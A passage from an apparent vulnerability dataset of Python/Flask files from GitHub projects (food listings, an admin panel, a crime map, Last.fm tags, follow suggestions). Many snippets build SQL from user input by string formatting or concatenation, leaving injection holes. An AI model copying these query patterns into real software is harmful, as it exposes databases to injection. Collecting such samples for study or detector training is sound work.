---------------------------------------------------#\n\n\ncompleted = \"\\'Completed\\'\"\n\n\n@app.route(\"/api/markComplete/<int:clientID>/<int:listingID>\", methods=['GET'])\ndef mark_as_complete(clientID, listingID):\n    \"\"\" A function that changes the status of the order with listing id listing_id to complete.\n        Returns \"Success\" on a sucessful change of the listing id's order to complete.\n\n        @param clientID: the client id number to change the status.\n        @param listingID: the listing id number to change the status.\n        @rtype: str\n    \"\"\"\n\n    sql = \\\n        \"\"\"\n            UPDATE public.{}\n            SET {} = {}\n            WHERE {} = {} AND {} = {}\n        \"\"\".format(order_table_name, order_status_col, completed, order_listing_id_col, str(listingID),\n                   order_client_id_col, str(clientID))\n\n    cur = conn.cursor()\n    try:\n        cur.execute(sql)\n        conn.commit()\n    except Exception as e:\n        raise Exception(e)\n\n    # Check to see if a row in the database has been updated.\n    if cur.rowcount == 0:\n        raise Exception(\"The status of listing id's order was not changed. ClientID or ListingID may be out of range.\")\n    return \"Success\"\n\n\n#--------------------------------------------------- SEARCH ---------------------------------------------------#\n\n\n@app.route('/api/search/<string:search_query>', methods=['GET'])\ndef search(search_query):\n    \"\"\"\n    Return a string representation of a list of JSON objects. This list contains\n    objects that correspond to listings that match names or tags in the search query.\n    \"\"\"\n    # separate words in search_query with '+' in place of spaces\n    search_terms = search_query.split('+')\n\n    # want to remove whitespace and empty elements from the list\n    search_terms_filtered = []\n\n    for search_term in search_terms:\n        if not search_term.isspace() and not search_term == '':\n            search_terms_filtered.append(search_term)\n\n    matched_rows_by_name = get_rows_from_name(search_terms_filtered)\n\n    matched_rows_by_tag = get_rows_from_tag(search_terms_filtered)\n\n    matched_rows = matched_rows_by_name + matched_rows_by_tag\n\n    unique_matched_rows = list(set(matched_rows))  # remove duplicate rows\n\n    rows_to_json(unique_matched_rows)  # want to convert each row into a JSON string\n\n    return json.dumps({'data': unique_matched_rows})  # convert to string before returning\n\n\ndef get_rows_from_name(search_terms):\n    \"\"\"\n    Return a list of listing tuples whose Food Names correspond to words in search_terms.\n    \"\"\"\n    matched_rows = []\n\n    for search_term in search_terms:\n        search_names = conn.cursor()\n        search_names.execute(\"SELECT t1.{}, t1.{}, t1.{}, t1.{},\"\n                             \" t1.{}, t1.{} FROM public.{} as t1\"\n                             \" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} \"\n                             \"WHERE UPPER(t1.{}) LIKE UPPER(\\'%{}%\\')\".format(listing_listing_id_col,\n                                                                              listing_cook_id_col,\n                                                                              listing_food_name_col,\n                                                                              listing_price_col,\n                                                                              listing_location_col,\n                                                                              listing_image_col,\n                                                                              listing_table_name,\n                                                                              listing_tags_table_name,\n                                                                              listing_listing_id_col,\n                                                                              listing_tags_listing_id_col,\n                                                                              listing_food_name_col,\n                                                                              search_term))\n\n        search_names_row = search_names.fetchone()\n\n        while search_names_row is not None:\n            matched_rows.append(search_names_row)\n            search_names_row = search_names.fetchone()\n\n        search_names.close()\n\n    return matched_rows\n\n\ndef get_rows_from_tag(search_terms):\n    \"\"\"\n    Return a list of listing tuples whose tags correspond to words in search_terms.\n    \"\"\"\n    matched_rows = []\n\n    for search_term in search_terms:\n        search_tags = conn.cursor()\n        search_tags.execute(\"SELECT t1.{}, t1.{}, t1.{}, t1.{},\"\n                             \" t1.{}, t1.{} FROM public.{} as t1\"\n                             \" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} \"\n                             \"WHERE UPPER(t2.{}) LIKE UPPER(\\'%{}%\\')\".format(listing_listing_id_col,\n                                                                              listing_cook_id_col,\n                                                                              listing_food_name_col,\n                                                                              listing_price_col,\n                                                                              listing_location_col,\n                                                                              listing_image_col,\n                                                                              listing_table_name,\n                                                                              listing_tags_table_name,\n                                                                              listing_listing_id_col,\n                                                                              listing_tags_listing_id_col,\n                                                                              listing_tags_tag_col,\n                                                                              search_term))\n\n        search_tags_row = search_tags.fetchone()\n\n        while search_tags_row is not None:\n            matched_rows.append(search_tags_row)\n            search_tags_row = search_tags.fetchone()\n\n        search_tags.close()\n\n    return matched_rows\n\n\ndef rows_to_json(rows):\n    \"\"\"\n    Mutate rows such that each tuple in rows is converted to a JSON string representing the same information.\n    \"\"\"\n    for i in range(len(rows)):\n        rows[i] = json.dumps({'ListingID': rows[i][0],\n                                'CookID': rows[i][1],\n                                'Food Name': rows[i][2],\n                                'Price': rows[i][3],\n                                'Location': rows[i][4],\n                                'Image': rows[i][5]})\n\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\", port=80)\n    # host=\"0.0.0.0\", port=80\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/np1e/DefinitelyNotTwitter/blob/2c5c7156c81e33309886a1da60b7eb10f04b505b",
        "file_path": "/DefinitelyNotTwitter/admin.py",
        "source": "import functools\n\nfrom flask import(\n    Blueprint, flash, redirect, render_template, request, session, url_for, g\n)\nfrom werkzeug.security import check_password_hash, generate_password_hash\n\nfrom DefinitelyNotTwitter.database import get_db\nfrom . import user\nfrom . import database as db\nfrom . import user as user\nfrom DefinitelyNotTwitter.user import get_user\nfrom DefinitelyNotTwitter.auth import login_required\n\nbp = Blueprint('admin', __name__, url_prefix='/admin')\n\ndef admin_required(view):\n    @functools.wraps(view)\n    def wrapped_view(**kwargs):\n        if g.user is None:\n            return redirect(url_for('auth.login'))\n        elif g.user['admin'] != 1:\n            return redirect(url_for('blog.feedpage', page=0))\n\n        return view(**kwargs)\n    return wrapped_view\n\n@bp.route('/user_view')\n@bp.route('/user_view/<sort>')\n@admin_required\ndef user_view(sort='id.asc'):\n    db = get_db()\n    sortBy = sort.split('.')[0]\n    sortOrder = sort.split('.')[1]\n\n\n    query = 'SELECT * FROM user AS u LEFT OUTER JOIN (SELECT uid, count(uid) AS follower FROM follows GROUP BY uid) AS f ON u.id = f.uid ORDER BY ? {}'.format(sortOrder)\n    users = db.execute(\n        query, (sortBy,)\n    ).fetchall()\n    return render_template('admin/userview.html', users = users, sort='{}.{}'.format(sortBy, sortOrder))\n\n@bp.route('/')\n@bp.route('/<int:page>')\n@admin_required\ndef admin_panel(page=0):\n\n    db = get_db()\n\n    postcount = g.postcount\n\n    pagecount = int(postcount / 5 + 1)\n\n    posts = db.execute(\n        'SELECT * FROM post JOIN user WHERE post.uid = user.id AND post.reviewed = 1 ORDER BY created DESC LIMIT 5 OFFSET ?', (str(page*5),)\n    ).fetchall()\n\n    return render_template('admin/panel.html', posts = posts, pagecount=pagecount, page=page)\n\n@bp.route('/edituser/<int:id>', methods= ('GET', 'POST'))\n@admin_required\ndef edit_user(id):\n    user = get_user(id)\n\n    if request.method == 'POST':\n        username = request.form['username']\n        desc = request.form['desc']\n        role = request.form['role']\n        adminPwd = request.form['adminPwd']\n        db = get_db()\n        error = None\n        file = None\n        imgAdded = False\n\n        # check if the post request has the file part\n        if 'file' in request.files:\n              f = request.files['file']\n              filename = secure_filename(f.filename)\n              filetype = filename.rsplit('.', 1)[1].lower()\n              f.save(os.path.join(current_app.config['UPLOAD_FOLDER'], str(g.user[\"id\"])+\".\"+filetype))\n              imgAdded = True\n\n        if not check_password_hash(g.user['password'], adminPwd):\n            error = 'Incorrect admin password. Correct password required to edit user.'\n\n        if error is None:\n            if username is not \"\":\n                db.execute(\n                    'UPDATE user SET name = ? WHERE id = ?', (username, id,)\n                )\n            if desc is not \"\":\n                db.execute(\n                    'UPDATE user SET descrip = ? WHERE id = ?', (desc, id,)\n                )\n            if imgAdded:\n                db.execute(\n                    'UPDATE user SET avatar = 1 WHERE id = ?', (id,)\n                )\n            if role == 'restricted':\n                db.execute(\n                    'UPDATE user SET restricted = 1 WHERE id = ?', (id,)\n                )\n            if role == 'admin':\n                db.execute(\n                    'UPDATE user SET admin = 1 WHERE id = ?', (id,)\n                )\n            db.commit()\n            return redirect(url_for('user.show_profile', id = user['id']))\n\n        flash(error)\n\n    return render_template('admin/edituser.html', user = user)\n\n@bp.route('/restrict/<int:id>')\n@admin_required\ndef restrict(id):\n\n    db = get_db()\n    user = get_user(id)\n    error = None\n\n    if user['restricted'] == 1:\n        error = \"User already restricted.\"\n    elif user['admin'] == 1:\n        error = \"Cannot restrict admins.\"\n\n    if error is None:\n        db.execute(\n            'UPDATE user SET restricted = 1 WHERE id = ?', (id,)\n        )\n        db.commit()\n        return redirect(url_for('admin.user_view'))\n\n    flash(error)\n    return redirect(url_for('admin.user_view'))\n\n\n@bp.route('/unrestrict/<int:id>')\n@admin_required\ndef unrestrict(id):\n\n    db = get_db()\n    user = get_user(id)\n    error = None\n\n    if user['restricted'] != 1:\n        error = \"User already unrestricted.\"\n\n    if error is None:\n        db.execute(\n            'UPDATE user SET restricted = 0 WHERE id = ?', (id,)\n        )\n        db.commit()\n        return redirect(url_for('admin.user_view'))\n\n    flash(error)\n    return redirect(url_for('admin.user_view'))\n\n@bp.route('/delete/<int:id>')\n@admin_required\ndef delete(id):\n\n    db = get_db()\n\n    db.execute(\n        'DELETE FROM user WHERE id = ?', (id,)\n    )\n    db.commit()\n\n    message = \"Deleted user!\"\n    flash(message)\n    return redirect(url_for('admin.user_view'))\n\n@bp.route('/promote/<int:id>')\n@admin_required\ndef promote(id):\n\n    db=get_db()\n    user = get_user(id)\n    error = None\n\n    if user['restricted'] == 1:\n        error = 'Cannot promote restricted user.'\n    elif user['admin'] == 1:\n        error = 'User is already an admin.'\n\n    if error is None:\n        db.execute(\n            'UPDATE user SET admin = 1 WHERE id = ?', (id,)\n        )\n        db.commit()\n        return redirect(url_for('admin.user_view'))\n\n    flash(error)\n    return redirect(url_for('admin.user_view'))\n\n@bp.route('/strip/<int:id>')\n@admin_required\ndef strip(id):\n\n    db=get_db()\n    user = get_user(id)\n    error = None\n\n    if user['admin'] != 1:\n        error = 'User has no admin rights.'\n\n    if error is None:\n        db.execute(\n            'UPDATE user SET admin = 0 WHERE id = ?', (id,)\n        )\n        db.commit()\n        return redirect(url_for('admin.user_view'))\n\n    flash(error)\n    return redirect(url_for('admin.user_view'))\n\n\n@bp.route('post/release/<int:pid>')\n@admin_required\ndef release_post(pid):\n    db = get_db()\n\n    db.execute(\n        'UPDATE post SET reviewed = 0 WHERE pid = ?', (pid,)\n    )\n    db.commit()\n    message = \"Released post!\"\n    flash(message)\n    return redirect(url_for('admin.admin_panel'))\n\n\n@bp.route('post/delete/<int:pid>')\n@admin_required\ndef delete_post(pid):\n\n    db = get_db()\n\n    db.execute(\n        'DELETE FROM post WHERE pid = ?', (pid,)\n    )\n    db.commit()\n    message=\"Deleted post!\"\n    flash(message)\n    return redirect(url_for('admin.admin_panel'))\n\n\n@bp.before_app_request\ndef load_posts_to_be_reviewed():\n    if g.user:\n        if g.user['admin'] == 1:\n            posts = get_db().execute(\n                'SELECT * FROM post WHERE reviewed = 1'\n            ).fetchall()\n            g.postcount = len(posts)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kayfay/python-flask-crime-map/blob/95eefee1b0eef0170ffb8712c5d8f531b9f7eb88",
        "file_path": "/dbhelper.py",
        "source": "\"\"\"\nDatabase helper class.\n\"\"\"\nimport pymysql\nimport dbconfig\n\nclass DBHelper:\n    def connect(self, database=\"crimemap\"):\n        return pymysql.connect(host='localhost',\n                               user=dbconfig.db_user,\n                               passwd=dbconfig.db_password,\n                               db=database)\n\n    def get_all_inputs(self):\n        connection = self.connect()\n        try:\n            query = \"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n            return cursor.fetchall()\n        finally:\n            connection.close()\n\n\n    def add_input(self, data):\n        connection = self.connect()\n        try:\n            # This will cause a security flaw.\n            query = \"INSERT INTO crimes (description) VALUES ('{}');\".format(data)\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n\n    def clear_all(self):\n        connection = self.connect()\n        try:\n            query = \"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/pukkapies/urop2019/blob/6dd68c15d86fc40e644a4cccc51a035730f401cf",
        "file_path": "/modules/query_lastfm.py",
        "source": "''' Contains simple tools for querying the lastfm_tags.db file\n\n\nNotes\n-----\nThe lastfm database contains 3 tables: tids, tags, tid_tag.\n- tids, 1-column table containing the track ids.\n- tid_tags, contains 3 columns:\n    - tid: rowid of the track id in the tids table.\n    - tag: rowid of the tag that belongs to the tid in the same row.\n    - val: number between 0 and 100 (guessing this is how accurate the tag is?)\n- tags, 1-column table containing the tags.\n\nIMPORTANT: If using this script elsewhere than on Boden then run set_path(new_path) to\nset the path of the database. Otherwise it will use the default path, which is the path\nto the database on Boden.\n\nFunctions\n---------\n- set_path\n    Set path to the lastfm_tags.db.\n'''\n\nimport sqlite3\n\npath = '/srv/data/msd/lastfm/SQLITE/lastfm_tags.db'\n\ndef set_path(new_path):\n    ''' Sets new_path as default path for the last.fm database. '''\n    global path\n    path = new_path\n\nclass LastFm:\n    ''' Opens a SQLite connection to the last.fm database. Provides methods to perform advanced queries on it.\n\n    Methods\n    -------\n    - tid_to_tid_nums\n        Get tid_num given tid.\n\n    - tid_num_to_tid\n        Get tid given tid_num.\n\n    - tid_num_to_tag_nums\n        Get tag_num given tid_num.\n\n    - tag_num_to_tag\n        Get tag given tag_num.\n\n    - tag_to_tag_num\n        Get tag_num given tag.\n\n    - get_tags\n        Get a list of tags associated to given tid.\n\n    - get_tags_dict\n        Get a dict with tids as keys and a list of its tags as value.\n\n    - tid_tag_count\n        Get a dict with tids as keys and its number of tags as value.\n\n    - filter_tags\n        Filter list of tids based on minimum number of tags.\n\n    - tag_count\n        Get a dict with the tags associated to tids as keys and their count number as values.\n    '''\n\n    def __init__(self, path):\n        self.conn = sqlite3.connect(path)\n        self.c = self.conn.cursor()\n    \n    def __del__(self): # close the connection gracefully when the object goes out of scope\n        self.conn.close()\n\n    def query(self, query):\n        return self.c.execute(query)\n\n    def tid_to_tid_num(self, tid):\n        ''' Returns tid_num, given tid. '''\n\n        q = \"SELECT rowid FROM tids WHERE tid = '\" + tid + \"'\"\n        self.query(q)\n        return self.c.fetchone()[0]\n\n    def tid_num_to_tid(self, tid_num):\n        ''' Returns tid, given tid_num. '''\n\n        q = \"SELECT tid FROM tids WHERE rowid = '\" + str(tid_num) + \"'\"\n        self.query(q)\n        return self.c.fetchone()[0]\n\n    def tid_num_to_tag_nums(self, tid_num):\n        ''' Returns list of the associated tag_nums to the given tid_num. '''\n\n        q = \"SELECT tag FROM tid_tag WHERE tid = '\" + str(tid_num) + \"'\"\n        self.query(q)\n        return [i[0] for i in self.c.fetchall()]\n        \n    def tag_num_to_tag(self, tag_num):\n        ''' Returns tag given tag_num. '''\n\n        q = \"SELECT tag FROM tags WHERE rowid = '\" + str(tag_num) + \"'\"\n        self.query(q)\n        return self.c.fetchone()[0]\n\n    def tag_to_tag_num(self, tag):\n        ''' Returns tag_num given tag. '''\n\n        q = \"SELECT rowid FROM tags WHERE tag = '\" + tag + \"'\"\n        self.query(q)\n        return self.c.fetchone()[0]\n\n    def get_tids_with_tag(self):\n        ''' Gets tids which have at least one tag. '''\n\n        q = \"SELECT tid FROM tids\"\n        self.query(q)\n        return [i[0] for i in self.c.fetchall()]\n\n    def get_tags(self, tid):\n        ''' Gets tags for a given tid. '''\n        \n        tags = []\n        for tag_num in self.tid_num_to_tag_nums(self.tid_to_tid_num(tid)):\n            tags.append(self.tag_num_to_tag(tag_num))\n        return tags\n\n    def get_tags_dict(self, tids):\n        ''' Gets tags for a given list of tids.\n        \n        Parameters\n        ----------\n        tids : list\n            List containing tids as strings.\n\n        Returns\n        -------\n        tag_dict : dict\n            The keys are the tids from the input list.\n            The values are lists of tags for each given tid.\n        '''\n\n        tags_dict = {}\n        for tid in tids:\n            tags_dict[tid] = self.get_tags(tid)\n        return tags_dict\n\n    def tag_count(self, tids):\n        ''' Gets number of tags for each given tid.\n        \n        Parameters\n        ----------\n        tids : list\n            List containing tids as strings.\n\n        Returns\n        -------\n        count_dict : dict\n            The keys are the tags associated to any tid from the input list.\n            The values are the number of tids which the given tag is associated to.\n        '''\n\n        count_dict = {}\n        for tag_list in self.get_tags_dict(tids).values():\n            for tag in tag_list:\n                if tag not in count_dict:\n                    count_dict[tag] = 1\n                else:\n                    count_dict[tag] += 1 \n        return count_dict\n\n    def tid_tag_count(self, tids):\n        ''' Gets number of tags for each given tid.\n        \n        Parameters\n        ----------\n        tids : list\n            List containing tids as strings.\n\n        Returns\n        -------\n        count_dict : dict\n            The keys are the tids from the input list.\n            The values are the number of tags for each given tid.\n        '''\n\n        count_dict = {}\n        for tid in tids:\n            count_dict[tid] = len(self.get_tags(tid))\n        return count_dict\n\n    def filter_tags(self, tids, min_tags):\n        ''' Given list of tids, returns list of those with more than min_tags tags. '''\n\n        count_dict = self.tid_tag_count(tids)\n        tids_filtered = [tid for tid in tids if count_dict[tid] >= min_tags]\n        return tids_filtered",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kyle-gearhart/pyshortcuts/blob/fdaaa6d2d182986b6db479d3b8afab366215da98",
        "file_path": "/pyshortcuts/job/JobTableActions.py",
        "source": "\n\n\nclass JobTableActions:\n\n    def __init__(self, database, tableName):\n\n        self.database = database\n        self.tableName = tableName\n\n    def jobIsRunning(self, jobName):\n\n        sql = \"\"\"SELECT * FROM %s \n            WHERE job_name = ?\n                AND job_running = 1\"\"\" % (self.tableName)\n\n        print sql\n\n        with self.database.cursor() as c:\n            rows = c.execute(sql, (jobName,))\n\n            if rows:\n                return True\n        \n        return False\n\n    def startJob(self, jobName, jobPlatform):\n\n        sql = \"\"\"INSERT INTO %s ( \n            job_name, \n            job_started, \n            job_running,\n            job_platform ) VALUES (\n                ?,\n                NOW(),\n                1,\n                ?\n            )\"\"\" % (self.tableName)\n\n        print sql\n\n        with self.database.cursor() as c:\n            c.execute(sql, (jobName, jobPlatform))\n            return c.lastrowid\n        \n        return -1\n\n    def finishJob(self, jobId, success, message):\n\n        sql = \"\"\"UPDATE %s\n            SET job_finished = NOW(),\n                job_running = 0,\n                job_successs = ?,\n                job_message = ?\n            WHERE job_id = ?\"\"\" % (self.tableName)\n\n        with self.database.cursor() as c:\n            c.execute(sql, (success, message, jobId,))\n            return True\n\n        return False",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/young-goons/rifflo-server/blob/fbfa2bf4591ee01c34b31e91abd79340335c65b5",
        "file_path": "/server/ygoons/modules/user/follow_suggest.py",
        "source": "\"\"\"\nFunctions for getting suggested users to follow.\n\"\"\"\nimport numpy as np\n\n\ndef get_suggest_follow(user_id, cnx):\n    \"\"\"Suggest users to follow.\n    Args:\n        user_id (int): id of user\n        cnx: DB connection\n    Returns:\n        list: ordered suggestion list of user_ids\n    \"\"\"\n    cands = _get_degree_2(user_id, cnx)\n    return _sort_similarity(user_id, cands, cnx)\n\n\ndef _sort_similarity(user_id, cands, cnx):\n    \"\"\"Get most similar users according to taste.\n    Args:\n        user_id (int): id of user to suggest for\n        cands (list(int)): ids of candidate users\n        cnx: DB connection\n\n    Returns:\n        list: cands ordered by decreasing similarity\n    \"\"\"\n    users_tmp = ', '.join(list(map(str, [user_id] + cands)))\n    sql = '''\n    WITH all_songs_analysis AS\n    (\n        SELECT\n            tbl_like.user_id AS user_id,\n            danceability,\n            energy,\n            loudness,\n            acousticness,\n            instrumentalness,\n            liveness,\n            valence\n        FROM\n            tbl_like JOIN tbl_post\n            ON (tbl_like.post_id = tbl_post.post_id)\n            JOIN tbl_music_analysis\n            ON (tbl_post.song_id = tbl_music_analysis.song_id)\n        WHERE tbl_like.user_id IN (%s)\n    )\n    SELECT\n        user_id,\n        AVG(danceability),\n        AVG(energy),\n        AVG(loudness),\n        AVG(acousticness),\n        AVG(instrumentalness),\n        AVG(liveness),\n        AVG(valence)\n    FROM all_songs_analysis\n    GROUP BY user_id\n    ''' % (users_tmp)\n    with cnx.cursor() as cursor:\n        cursor.execute(sql)\n        res = cursor.fetchall()\n    attributes_map = {}\n    for i in range(len(res)):\n        uid = res[i][0]\n        uattributes = np.array(res[i][1:])\n        attributes_map[uid] = uattributes\n\n    # Sort by cosine similarity\n    def _cosine_similarity(u, v):\n        try:\n            a = attributes_map[u]\n            b = attributes_map[v]\n        except KeyError:\n            return -2.  # Smaller than smallest possible cosine\n\n        return np.dot(a, b) / np.linalg.norm(a) / np.linalg.norm(b)\n\n    return sorted(cands, key=lambda uid: _cosine_similarity(user_id, uid))\n\n\ndef _get_degree_2(user_id, cnx):\n    \"\"\"Get all users of degree 2 follow that are not currently followed.\n    Example:\n        this user (follows) user B (follows) user B\n        AND user (does NOT follow) user B\n        means that user B will be in the list\n    Args:\n        user_id (int): id of user\n        cnx: DB connection\n    Returns:\n        list: list of user_ids\n    \"\"\"\n    sql = 'WITH tmp_suggest (followed_id) AS ' \\\n    '(' \\\n        'SELECT b.followed_id AS followed_id ' \\\n        'FROM ' \\\n            'tbl_follow a INNER JOIN tbl_follow b ' \\\n            'ON a.followed_id = b.follower_id ' \\\n        'WHERE a.follower_id = %s ' \\\n        'AND b.followed_id NOT IN ' \\\n            '(SELECT followed_id FROM tbl_follow WHERE follower_id = %s) ' \\\n        'AND b.followed_id != %s ' \\\n    ') ' \\\n    'SELECT followed_id, COUNT(*) AS num_mutual FROM tmp_suggest ' \\\n    'GROUP BY followed_id ' \\\n    'ORDER BY num_mutual DESC' % (user_id, user_id, user_id)\n    with cnx.cursor() as cursor:\n        cursor.execute(sql)\n        res = cursor.fetchall()\n    return list(map(lambda x: x[0], res))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/young-goons/rifflo-server/blob/fb311df76713b638c9486250f9badb288ffb2189",
        "file_path": "/server/ygoons/modules/user/follow_suggest.py",
        "source": "\"\"\"\nFunctions for getting suggested users to follow.\n\"\"\"\nimport numpy as np\n\n\ndef get_suggest_follow(user_id, cnx):\n    \"\"\"Suggest users to follow.\n    Args:\n        user_id (int): id of user\n        cnx: DB connection\n    Returns:\n        list: ordered suggestion list of user_ids\n    \"\"\"\n    cands = _get_degree_2(user_id, cnx)\n    return _sort_similarity(user_id, cands, cnx)\n\n\ndef _sort_similarity(user_id, cands, cnx):\n    \"\"\"Get most similar users according to taste.\n    Args:\n        user_id (int): id of user to suggest for\n        cands (list(int)): ids of candidate users\n        cnx: DB connection\n\n    Returns:\n        list: cands ordered by decreasing similarity\n    \"\"\"\n    users_tmp = ', '.join(list(map(str, [user_id] + cands)))\n    sql = '''\n    WITH all_songs_analysis AS\n    (\n        SELECT\n            tbl_like.user_id AS user_id,\n            danceability,\n            energy,\n            loudness,\n            acousticness,\n            instrumentalness,\n            liveness,\n            valence\n        FROM\n            tbl_like JOIN tbl_post\n            ON (tbl_like.post_id = tbl_post.post_id)\n            JOIN tbl_music_analysis\n            ON (tbl_post.song_id = tbl_music_analysis.song_id)\n        WHERE tbl_like.user_id IN (%s)\n    )\n    SELECT\n        user_id,\n        AVG(danceability),\n        AVG(energy),\n        AVG(loudness),\n        AVG(acousticness),\n        AVG(instrumentalness),\n        AVG(liveness),\n        AVG(valence)\n    FROM all_songs_analysis\n    GROUP BY user_id\n    ''' % (users_tmp)\n    with cnx.cursor() as cursor:\n        cursor.execute(sql)\n        res = cursor.fetchall()\n    attributes_map = {}\n    for i in range(len(res)):\n        uid = res[i][0]\n        uattributes = np.array(res[i][1:])\n        attributes_map[uid] = uattributes\n\n    # Sort by cosine similarity\n    def _cosine_similarity(u, v):\n        try:\n            a = attributes_map[u]\n            b = attributes_map[v]\n        except KeyError:\n            return -2.  # Smaller than smallest possible cosine\n\n        return np.dot(a, b) / np.linalg.norm(a) / np.linalg.norm(b)\n\n    return sorted(cands, key=lambda uid: _cosine_similarity(user_id, uid))\n\n\ndef _get_degree_2(user_id, cnx):\n    \"\"\"Get all users of degree 2 follow that are not currently followed.\n    Example:\n        this user (follows) user B (follows) user B\n        AND user (does NOT follow) user B\n        means that user B will be in the list\n    Args:\n        user_id (int): id of user\n        cnx: DB connection\n    Returns:\n        list: list of user_ids\n    \"\"\"\n    sql = 'WITH tmp_suggest (followed_id) AS ' \\\n    '(' \\\n        'SELECT b.followed_id AS followed_id ' \\\n        'FROM ' \\\n            'tbl_follow a INNER JOIN tbl_follow b ' \\\n            'ON a.followed_id = b.follower_id ' \\\n        'WHERE a.follower_id = %s ' \\\n        'AND b.followed_id NOT IN ' \\\n            '(SELECT followed_id FROM tbl_follow WHERE follower_id = %s) ' \\\n        'AND b.followed_id != %s ' \\\n    ') ' \\\n    'SELECT followed_id, COUNT(*) AS num_mutual FROM tmp_suggest ' \\\n    'GROUP BY followed_id ' \\\n    'ORDER BY num_mutual DESC'\n    with cnx.cursor() as cursor:\n        cursor.execute(sql, (user_id, user_id, user_id))\n        res = cursor.fetchall()\n    return list(map(lambda x: x[0], res))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/young-goons/rifflo-server/blob/7392c7eae96dd03a46d20dc0222b911974e8ed99",
        "file_path": "/server/ygoons/modules/user/follow_suggest.py",
        "source": "\"\"\"\nFunctions for getting suggested users to follow.\n\"\"\"\nimport numpy as np\n\n\ndef get_suggest_follow(user_id, cnx):\n    \"\"\"Suggest users to follow.\n    Args:\n        user_id (int): id of user\n        cnx: DB connection\n    Returns:\n        list: ordered suggestion list of user_ids\n    \"\"\"\n    cands = _get_degree_2(user_id, cnx)\n    return _sort_similarity(user_id, cands, cnx)\n\n\ndef _sort_similarity(user_id, cands, cnx):\n    \"\"\"Get most similar users according to taste.\n    Args:\n        user_id (int): id of user to suggest for\n        cands (list(int)): ids of candidate users\n        cnx: DB connection\n\n    Returns:\n        list: cands ordered by decreasing similarity\n    \"\"\"\n    users_tmp = ', '.join(list(map(str, [user_id] + cands)))\n    sql = '''\n    WITH all_songs_analysis AS\n    (\n        SELECT\n            tbl_like.user_id AS user_id,\n            danceability,\n            energy,\n            loudness,\n            acousticness,\n            instrumentalness,\n            liveness,\n            valence\n        FROM\n            tbl_like JOIN tbl_post\n            ON (tbl_like.post_id = tbl_post.post_id)\n            JOIN tbl_music_analysis\n            ON (tbl_post.song_id = tbl_music_analysis.song_id)\n        WHERE tbl_like.user_id IN (%s)\n    )\n    SELECT\n        user_id,\n        AVG(danceability),\n        AVG(energy),\n        AVG(loudness),\n        AVG(acousticness),\n        AVG(instrumentalness),\n        AVG(liveness),\n        AVG(valence)\n    FROM all_songs_analysis\n    GROUP BY user_id\n    ''' % (users_tmp)\n    with cnx.cursor() as cursor:\n        cursor.execute(sql)\n        res = cursor.fetchall()\n    attributes_map = {}\n    for i in range(len(res)):\n        uid = res[i][0]\n        uattributes = np.array(res[i][1:])\n        attributes_map[uid] = uattributes\n\n    # Sort by cosine similarity\n    def _cosine_similarity(u, v):\n        try:\n            a = attributes_map[u]\n            b = attributes_map[v]\n        except KeyError:\n            return -2.  # Smaller than smallest possible cosine\n\n        return np.dot(a, b) / np.linalg.norm(a) / np.linalg.norm(b)\n\n    return sorted(cands, key=lambda uid: _cosine_similarity(user_id, uid))\n\n\ndef _get_degree_2(user_id, cnx):\n    \"\"\"Get all users of degree 2 follow that are not currently followed.\n    Example:\n        this user (follows) user B (follows) user B\n        AND user (does NOT follow) user B\n        means that user B will be in the list\n    Args:\n        user_id (int): id of user\n        cnx: DB connection\n    Returns:\n        list: list of user_ids\n    \"\"\"\n    sql = 'WITH tmp_suggest AS ' \\\n    '(' \\\n        'SELECT b.followed_id AS followed_id ' \\\n        'FROM ' \\\n            'tbl_follow a INNER JOIN tbl_follow b ' \\\n            'ON a.followed_id = b.follower_id ' \\\n        'WHERE a.follower_id = %s ' \\\n        'AND b.followed_id NOT IN ' \\\n            '(SELECT followed_id FROM tbl_follow WHERE follower_id = %s) ' \\\n        'AND b.followed_id != %s ' \\\n    ') ' \\\n    'SELECT followed_id, COUNT(*) AS num_mutual FROM tmp_suggest ' \\\n    'GROUP BY followed_id ' \\\n    'ORDER BY num_mutual DESC'\n    with cnx.cursor() as cursor:\n        cursor.execute(sql, (user_id, user_id, user_id))\n        res = cursor.fetchall()\n    return list(map(lambda x: x[0], res))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/young-goons/rifflo-server/blob/e6d943188447879dd5be99e84cc40f7e784086e0",
        "file_path": "/server/ygoons/modules/user/follow_suggest.py",
        "source": "\"\"\"\nFunctions for getting suggested users to follow.\n\"\"\"\nimport numpy as np\n\n\ndef get_suggest_follow(user_id, cnx):\n    \"\"\"Suggest users to follow.\n    Args:\n        user_id (int): id of user\n        cnx: DB connection\n    Returns:\n        list: ordered suggestion list of user_ids\n    \"\"\"\n    cands = _get_degree_2(user_id, cnx)\n    return _sort_similarity(user_id, cands, cnx)\n\n\ndef _sort_similarity(user_id, cands, cnx):\n    \"\"\"Get most similar users according to taste.\n    Args:\n        user_id (int): id of user to suggest for\n        cands (list(int)): ids of candidate users\n        cnx: DB connection\n\n    Returns:\n        list: cands ordered by decreasing similarity\n    \"\"\"\n    users_tmp = ', '.join(list(map(str, [user_id] + cands)))\n    sql = '''\n    WITH all_songs_analysis AS\n    (\n        SELECT\n            tbl_like.user_id AS user_id,\n            danceability,\n            energy,\n            loudness,\n            acousticness,\n            instrumentalness,\n            liveness,\n            valence\n        FROM\n            tbl_like JOIN tbl_post\n            ON (tbl_like.post_id = tbl_post.post_id)\n            JOIN tbl_music_analysis\n            ON (tbl_post.song_id = tbl_music_analysis.song_id)\n        WHERE tbl_like.user_id IN (%s)\n    )\n    SELECT\n        user_id,\n        AVG(danceability),\n        AVG(energy),\n        AVG(loudness),\n        AVG(acousticness),\n        AVG(instrumentalness),\n        AVG(liveness),\n        